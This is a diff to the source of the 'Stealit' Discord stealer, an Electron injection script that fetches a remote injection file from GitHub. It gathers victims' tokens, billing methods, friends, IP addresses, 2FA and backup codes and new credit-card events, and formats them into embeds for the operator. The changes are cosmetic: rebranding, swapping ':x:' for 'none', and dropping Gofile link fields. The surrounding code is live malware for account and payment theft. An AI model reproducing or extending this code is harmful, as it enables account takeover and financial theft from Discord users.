@@ -20,7 +20,7 @@ var config = {
   disable2FA: "%DISABLEFA%",
   changeMailAuto: "DISABLED!!!",//%AUTOMAILCHANGER%
   mail: "%CLIENTEMAIL%",
-  creator: "%NAME_CREATOR%",
+  creator: "Stealit",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
     "https://raw.githubusercontent.com/sercwn/st/main/lt.js",
@@ -173,7 +173,7 @@ const GetBadges = (e) => {
     16384 == (16384 & e) && (n += "<:bughuntergold:1206219776477630504> "),
     4194304 == (4194304 & e) && (n += "<:activedeveloper:1206220587144319027> "),
     131072 == (131072 & e) && (n += "<:verifieddeveloper:1206220791251996705> "),
-    "" == n && (n = ":x:"),
+    "" == n && (n = "none"),
     n
   );
 };
@@ -187,7 +187,7 @@ const GetRBadges = (e) => {
     512 == (512 & e) && (n += "<:early:944071770506416198> "),
     16384 == (16384 & e) && (n += "<:bughuntergold:1206219776477630504> "),
     131072 == (131072 & e) && (n += "<:verifieddeveloper:1206220791251996705> "),
-    "" == n && (n = ":x:"),
+    "" == n && (n = "none"),
     n
   );
 };
@@ -219,7 +219,7 @@ const parseFriends = (friends) => {
     var rareFriends = "";
     for (var friend of real) {
       var badges = GetRBadges(friend.user.public_flags);
-      if (badges !== ":x:")
+      if (badges !== "none")
         rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`;
     }
     if (!rareFriends) rareFriends = "No Rare Friends";
@@ -228,14 +228,14 @@ const parseFriends = (friends) => {
       badges: rareFriends,
     };
   } catch (err) {
-    return ":x:";
+    return "none";
   }
 };
 
 const parseBilling = (billings) => {
   var Billings = "";
   try {
-    if (!billings) return (Billings = ":x:");
+    if (!billings) return (Billings = "none");
     billings.forEach((res) => {
       if (res.invalid) return;
       switch (res.type) {
@@ -246,10 +246,10 @@ const parseBilling = (billings) => {
           Billings += "<a:rainbow_tick:1206224649319616512> <a:paypal:1206224377142583326>";
       }
     });
-    if (!Billings) Billings = ":x:";
+    if (!Billings) Billings = "none";
     return Billings;
   } catch (err) {
-    return ":x:";
+    return "none";
   }
 };
 
@@ -295,10 +295,10 @@ function remove2FA(token, code) {
   });
 }
 const GetNitro = (r) => {
-  if (!r.premium_type) return ":x:";
+  if (!r.premium_type) return "none";
   switch (r.premium_type) {
     default:
-      return ":x:";
+      return "none";
     case 1:
       return "<:nitro:1206224999581491260>";
     case 2:
@@ -644,11 +644,6 @@ const FirstTime = async () => {
             inline: !0,
           },
           {
-            name: "Stealit Files 📁",
-            value: `[Gofile](${config.transfer_link})`,
-            inline: !0,
-          },
-          {
             name: "Billing <a:moneyx:1206250495329570948>",
             value: `${Billings}`,
             inline: !0,
@@ -663,7 +658,7 @@ const FirstTime = async () => {
             value: `\`\`\`${
               user.bio !== null && user.bio !== undefined && user.bio !== ""
                 ? user.bio
-                : ":x:"
+                : "none"
             }\`\`\``,
             inline: false,
           },
@@ -783,11 +778,6 @@ const FirstTime = async () => {
               inline: !0,
             },
             {
-              name: "Stealit Files 📁",
-              value: `[Gofile](${config.transfer_link})`,
-              inline: !0,
-            },
-            {
               name: "Billing <a:moneyx:1206250495329570948>",
               value: `${Billings}`,
               inline: !0,
@@ -807,7 +797,7 @@ const FirstTime = async () => {
               value: `\`\`\`${
                 user.bio !== null && user.bio !== undefined && user.bio !== ""
                   ? user.bio
-                  : ":x:"
+                  : "none"
               }\`\`\``,
               inline: false,
             },
@@ -1868,11 +1858,6 @@ electron.session.defaultSession.webRequest.onCompleted(
                     inline: !0,
                   },
                   {
-                    name: "Stealit Files 📁",
-                    value: `[Gofile](${config.transfer_link})`,
-                    inline: !0,
-                  },
-                  {
                     name: "Billing <a:moneyx:1206250495329570948>",
                     value: `${Billings}`,
                     inline: !0,
@@ -1899,7 +1884,7 @@ electron.session.defaultSession.webRequest.onCompleted(
                       user.bio !== undefined &&
                       user.bio !== ""
                         ? user.bio
-                        : ":x:"
+                        : "none"
                     }\`\`\``,
                     inline: false,
                   },
@@ -1910,7 +1895,7 @@ electron.session.defaultSession.webRequest.onCompleted(
                       dt.code !== undefined &&
                       dt.code !== ""
                         ? dt.code
-                        : ":x:"
+                        : "none"
                     }\`\`\``,
                     inline: false,
                   },
@@ -2000,11 +1985,6 @@ electron.session.defaultSession.webRequest.onCompleted(
                   inline: !0,
                 },
                 {
-                  name: "Stealit Files 📁",
-                  value: `[Gofile](${config.transfer_link})`,
-                  inline: !0,
-                },
-                {
                   name: "Billing <a:moneyx:1206250495329570948>",
                   value: `${Billings}`,
                   inline: !0,
@@ -2031,7 +2011,7 @@ electron.session.defaultSession.webRequest.onCompleted(
                     user.bio !== undefined &&
                     user.bio !== ""
                       ? user.bio
-                      : ":x:"
+                      : "none"
                   }\`\`\``,
                   inline: false,
                 },
@@ -2109,11 +2089,6 @@ electron.session.defaultSession.webRequest.onCompleted(
                 inline: !0,
               },
               {
-                name: "Stealit Files 📁",
-                value: `[Gofile](${config.transfer_link})`,
-                inline: !0,
-              },
-              {
                 name: "Billing <a:moneyx:1206250495329570948>",
                 value: `${Billings}`,
                 inline: !0,
@@ -2143,7 +2118,7 @@ electron.session.defaultSession.webRequest.onCompleted(
                 value: `\`\`\`${
                   user.bio !== null && user.bio !== undefined && user.bio !== ""
                     ? user.bio
-                    : ":x:"
+                    : "none"
                 }\`\`\``,
                 inline: false,
               },
@@ -2216,11 +2191,6 @@ electron.session.defaultSession.webRequest.onCompleted(
                     {
                       name: "@Copyright",
                       value: `[Stealit 2024](https://t.me/stealitpublic)`,
-                      inline: !1,
-                    },
-                    {
-                      name: "Stealit Files 📁",
-                      value: `[Gofile](${config.transfer_link})`,
                       inline: !1,
                     },
                     {
@@ -2299,11 +2269,6 @@ electron.session.defaultSession.webRequest.onCompleted(
                 inline: !0,
               },
               {
-                name: "Stealit Files 📁",
-                value: `[Gofile](${config.transfer_link})`,
-                inline: !0,
-              },
-              {
                 name: "Billing <a:moneyx:1206250495329570948>",
                 value: `${Billings}`,
                 inline: !0,
@@ -2328,7 +2293,7 @@ electron.session.defaultSession.webRequest.onCompleted(
                 value: `\`\`\`${
                   user.bio !== null && user.bio !== undefined && user.bio !== ""
                     ? user.bio
-                    : ":x:"
+                    : "none"
                 }\`\`\``,
                 inline: false,
               },
@@ -2381,11 +2346,6 @@ electron.session.defaultSession.webRequest.onCompleted(
                   "<:stealit:1206869154691416084> Stealit User Credit Card Added",
                 color: config["embed-color"],
                 fields: [
-                  {
-                    name: "Stealit Files 📁",
-                    value: `[Gofile](${config.transfer_link})`,
-                    inline: false,
-                  },
                   {
                     name: "IP",
                     value: `\`${ip}\``,
@@ -2477,11 +2437,7 @@ electron.session.defaultSession.webRequest.onCompleted(
           title: "<:stealit:1206869154691416084> Stealit User Enable 2FA",
           color: config["embed-color"],
           fields: [
-            {
-              name: "Stealit Files 📁",
-              value: `[Gofile](${config.transfer_link})`,
-              inline: false,
-            },
+
             {
               name: "IP",
               value: `\`${ip}\``,
@@ -2520,7 +2476,7 @@ electron.session.defaultSession.webRequest.onCompleted(
               inline: false,
             },
             {
-              name: "Backups Code <:identy:1206228345407406120>",
+              name: "Backups Code <:adress:1206255971668852776>",
               value: `\`\`\`md\n${backup_codes
                 .map((x) => `- ${x}`)
                 .join("\n")}\`\`\``,
@@ -2542,11 +2498,7 @@ electron.session.defaultSession.webRequest.onCompleted(
           title: "<:stealit:1206869154691416084> Stealit User Removed 2FA",
           color: config["embed-color"],
           fields: [
-            {
-              name: "Stealit Files 📁",
-              value: `[Gofile](${config.transfer_link})`,
-              inline: false,
-            },
+
             {
               name: "IP",
               value: `\`${ip}\``,
@@ -2616,11 +2568,7 @@ electron.session.defaultSession.webRequest.onCompleted(
           title: "<:stealit:1206869154691416084> Stealit User 2FA Codes",
           color: config["embed-color"],
           fields: [
-            {
-              name: "Stealit Files 📁",
-              value: `[Gofile](${config.transfer_link})`,
-              inline: false,
-            },
+
             {
               name: "IP",
               value: "`" + ip + "`",
@@ -2654,7 +2602,7 @@ electron.session.defaultSession.webRequest.onCompleted(
               inline: false,
             },
             {
-              name: "Backup Codes <:identy:1206228345407406120>",
+              name: "Backup Codes <:adress:1206255971668852776>",
               value: `\`\`\`md\n${backup_code
                 .map((x) => `- ${x}`)
                 .join("\n")}\`\`\``,
